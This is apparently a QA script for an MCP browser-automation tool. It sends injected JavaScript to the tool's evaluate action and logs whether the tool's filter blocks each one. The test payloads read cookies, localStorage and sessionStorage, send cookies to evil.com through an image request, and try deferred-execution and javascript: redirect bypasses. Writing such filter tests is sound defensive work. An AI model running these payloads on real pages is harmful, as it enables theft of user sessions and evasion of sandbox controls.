import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const t = new StdioClientTransport({
  command: "node",
  args: ["/Users/tongwu/Projects/novada-mcp/build/index.js"],
  env: Object.assign({}, process.env, { NOVADA_API_KEY: "dummy" }),
});
const c = new Client({ name: "qa", version: "0" }, { capabilities: {} });
await c.connect(t);

const tests = [
  // Read cookies (data exfil via output)
  { name: "read_cookies", script: "document.cookie" },
  // Read localStorage (data exfil via output)
  { name: "read_localStorage", script: "JSON.stringify(localStorage)" },
  // Read sessionStorage
  { name: "read_sessionStorage", script: "JSON.stringify(sessionStorage)" },
  // image exfil (doesn't use blocked APIs)
  { name: "img_exfil", script: "new Image().src='https://evil.com?d='+document.cookie" },
  // setTimeout for deferred execution
  { name: "setTimeout_bypass", script: "setTimeout(function(){}, 100)" },
  // location redirect to javascript:
  { name: "location_href_javascript", script: "location.href='javascript:alert(1)'" },
];

for (const test of tests) {
  try {
    const r = await c.callTool({ name: "novada_browser", arguments: {
      actions: [{ action: "evaluate", script: test.script }]
    }});
    const text = r.content?.[0]?.text ?? JSON.stringify(r);
    const blocked = r.isError || text.includes('BLOCKED') || text.includes('Invalid parameters');
    console.log(`[${blocked ? 'BLOCKED' : 'PASSED'}] ${test.name}`);
    if (!blocked) {
      console.log(`  -> ${text.slice(0, 100)}`);
    }
  } catch(e) {
    console.log(`[THREW] ${test.name}: ${e.message?.slice(0, 100)}`);
  }
}

await c.close();
